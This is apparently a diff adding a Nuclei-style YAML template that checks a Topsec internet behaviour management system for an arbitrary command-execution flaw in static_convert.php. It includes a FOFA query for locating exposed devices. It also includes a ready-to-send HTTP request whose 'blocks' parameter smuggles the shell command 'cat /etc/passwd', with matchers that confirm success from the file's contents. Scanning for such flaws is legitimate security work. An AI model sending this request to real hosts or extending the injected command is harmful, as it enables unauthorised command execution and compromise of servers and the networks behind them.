@@ -1,0 +1,31 @@
+id: topsec-shangwangxingwei-RCE
+
+info:
+  name: 天融信上网行为管理系统 static_convert 任意命令执行
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="/images/arrow03.png" && body="400-7770777"
+    天融信上网行为管理系统 /view/IPV6/naborTable/static_convert.php接口blocks参数存在任意命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140315555
+  tags: RCE
+
+
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
